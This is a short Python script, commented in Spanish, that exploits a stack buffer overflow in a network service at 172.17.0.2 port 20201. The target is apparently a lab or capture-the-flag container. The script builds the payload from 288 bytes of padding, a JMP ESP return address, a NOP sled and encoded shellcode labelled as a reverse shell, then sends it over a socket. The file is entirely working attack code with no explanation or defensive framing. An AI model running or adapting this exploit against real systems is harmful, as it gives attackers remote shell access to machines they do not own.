#!/usr/bin/python3

import socket
from struct import pack

target_ip = "172.17.0.2"
target_port = 20201

buffer_size = 288
padding = b"A" * buffer_size
jmp_esp_address = pack("<L", 0x08049213)  # Dirección de JMP ESP obtenida con análisis previo.
nop_sled = b'\x90' * 32  # Pista de NOPs para mayor tolerancia.

# Shellcode personalizado para reverse shell
reverse_shellcode =  b""
reverse_shellcode += b"\xbd\xfc\x2f\x37\xfd\xda\xc4\xd9\x74\x24\xf4\x5b"
reverse_shellcode += b"\x2b\xc9\xb1\x12\x31\x6b\x12\x03\x6b\x12\x83\x3f"
reverse_shellcode += b"\x2b\xd5\x08\x8e\xef\xee\x10\xa3\x4c\x42\xbd\x41"
reverse_shellcode += b"\xda\x85\xf1\x23\x11\xc5\x61\xf2\x19\xf9\x48\x84"
reverse_shellcode += b"\x13\x7f\xaa\xec\x63\xd7\x49\x56\x0b\x2a\x52\xb8"
reverse_shellcode += b"\xad\xa3\xb3\x74\x4b\xe4\x62\x27\x27\x07\x0c\x26"
reverse_shellcode += b"\x8a\x88\x5c\xc0\x7b\xa6\x13\x78\xec\x97\xfc\x1a"
reverse_shellcode += b"\x85\x6e\xe1\x88\x06\xf8\x07\x9c\xa2\x37\x47"

crafted_payload = padding + jmp_esp_address + nop_sled + reverse_shellcode

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
